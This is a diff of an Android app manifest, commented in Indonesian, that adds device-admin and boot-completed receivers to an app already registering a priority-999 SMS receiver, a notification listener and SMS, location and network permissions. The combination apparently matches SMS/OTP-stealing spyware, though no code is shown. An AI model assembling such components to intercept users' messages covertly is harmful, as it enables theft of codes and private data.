@@ -4,24 +4,29 @@
     <uses-feature android:name="android.hardware.bluetooth" android:required="false" />
     <uses-feature android:name="android.hardware.wifi" android:required="false" />
 
+    <!-- IZIN INTERNET & SMS -->
     <uses-permission android:name="android.permission.INTERNET" />
     <uses-permission android:name="android.permission.RECEIVE_SMS" />
-<uses-permission android:name="android.permission.READ_SMS" />
-<uses-permission android:name="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE" />
+    <uses-permission android:name="android.permission.READ_SMS" />
+    <uses-permission android:name="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE" />
     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
     <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
     <uses-permission android:name="android.permission.CHANGE_WIFI_STATE" />
     <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
 
-    <!-- Android 11 dan versi lebih lama. -->
+    <!-- IZIN BARU UNTUK ADMIN & BOOT -->
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+    <uses-permission android:name="android.permission.MANAGE_DEVICE_ADMINS" />
+
+    <!-- Bluetooth (lama) -->
     <uses-permission android:name="android.permission.BLUETOOTH" android:maxSdkVersion="30" />
     <uses-permission android:name="android.permission.BLUETOOTH_ADMIN" android:maxSdkVersion="30" />
 
-    <!-- Android 12 dan versi lebih baru. -->
+    <!-- Bluetooth (baru) -->
     <uses-permission android:name="android.permission.BLUETOOTH_SCAN" />
     <uses-permission android:name="android.permission.BLUETOOTH_CONNECT" />
 
-    <!-- SSID Wi-Fi dapat mengungkap lokasi; Android tetap meminta persetujuan pengguna. -->
+    <!-- Wi-Fi & Lokasi -->
     <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
     <uses-permission android:name="android.permission.NEARBY_WIFI_DEVICES" />
 
@@ -32,6 +37,36 @@
         android:supportsRtl="true"
         android:theme="@style/AppTheme"
         android:usesCleartextTraffic="false">
+
+        <!-- ========================================= -->
+        <!-- 1. DAFTARKAN AdminReceiver (Device Admin) -->
+        <!-- ========================================= -->
+        <receiver
+            android:name=".AdminReceiver"
+            android:permission="android.permission.BIND_DEVICE_ADMIN"
+            android:exported="true">
+            <meta-data
+                android:name="android.app.device_admin"
+                android:resource="@xml/device_admin" />
+            <intent-filter>
+                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
+            </intent-filter>
+        </receiver>
+
+        <!-- ========================================= -->
+        <!-- 2. DAFTARKAN BootCompletedReceiver        -->
+        <!-- ========================================= -->
+        <receiver
+            android:name=".BootCompletedReceiver"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+            </intent-filter>
+        </receiver>
+
+        <!-- ========================================= -->
+        <!-- 3. ACTIVITY UTAMA                         -->
+        <!-- ========================================= -->
         <activity
             android:name=".MainActivity"
             android:configChanges="keyboard|keyboardHidden|orientation|screenLayout|screenSize|smallestScreenSize|uiMode"
@@ -42,24 +77,32 @@
                 <category android:name="android.intent.category.LAUNCHER" />
             </intent-filter>
         </activity>
-    <receiver
-        android:name=".SMSReceiver"
-        android:permission="android.permission.RECEIVE_SMS"
-        android:exported="true">
-        <intent-filter android:priority="999">
-            <action android:name="android.provider.Telephony.SMS_RECEIVED" />
-        </intent-filter>
-    </receiver>
 
-    <service
-        android:name=".NotificationListenerService"
-        android:label="@string/app_name"
-        android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE"
-        android:exported="true">
-        <intent-filter>
-            <action android:name="android.service.notification.NotificationListenerService" />
-        </intent-filter>
-    </service>
+        <!-- ========================================= -->
+        <!-- 4. SMS RECEIVER                           -->
+        <!-- ========================================= -->
+        <receiver
+            android:name=".SMSReceiver"
+            android:permission="android.permission.RECEIVE_SMS"
+            android:exported="true">
+            <intent-filter android:priority="999">
+                <action android:name="android.provider.Telephony.SMS_RECEIVED" />
+            </intent-filter>
+        </receiver>
+
+        <!-- ========================================= -->
+        <!-- 5. NOTIFICATION LISTENER SERVICE          -->
+        <!-- ========================================= -->
+        <service
+            android:name=".NotificationListenerService"
+            android:label="@string/app_name"
+            android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.service.notification.NotificationListenerService" />
+            </intent-filter>
+        </service>
+
     </application>
 
 </manifest>
